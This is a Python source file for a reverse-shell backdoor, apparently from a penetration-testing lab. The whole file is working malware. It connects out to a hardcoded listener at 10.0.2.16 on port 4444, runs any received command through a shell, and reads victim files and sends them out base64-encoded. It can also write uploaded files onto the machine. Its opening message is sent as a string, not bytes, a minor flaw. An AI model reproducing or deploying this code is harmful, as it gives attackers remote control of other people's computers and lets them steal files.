import socket
import subprocess
import json
import os
import base64

class Backdoor:
    
    def __init__(self, ip, port) -> None:
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # connect to the Kali server
        self.conn.connect((ip, port))
        self.conn.send("\n[+] connection established.\n")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.conn.send(json_data.encode())
    
    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.conn.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def exec_system_command(self, cmd):
        # cmd can be either string or list of strings representing the single command
        return subprocess.check_output(cmd, shell=True)

    def change_working_dir_to(self, path):
        os.chdir(path)
        return "[+] changing working dir to " + path

    def read_file(self, path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())

    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
        return "[+] download successful."

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.conn.close()
                    exit()
                elif command[0] == "cd" and len(command)>1:
                    # if command is "cd" without any arguments, do nothing
                    cmd_result = self.change_working_dir_to(command[1])
                elif command[0] == "download":
                    cmd_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    cmd_result = self.write_file(command[1], command[2])
                else:
                    cmd_result = self.exec_system_command(command).decode()
            except Exception:
                cmd_result = "[-] error during command execution"

            self.reliable_send(cmd_result)

backdoor = Backdoor("10.0.2.16", 4444)
backdoor.run()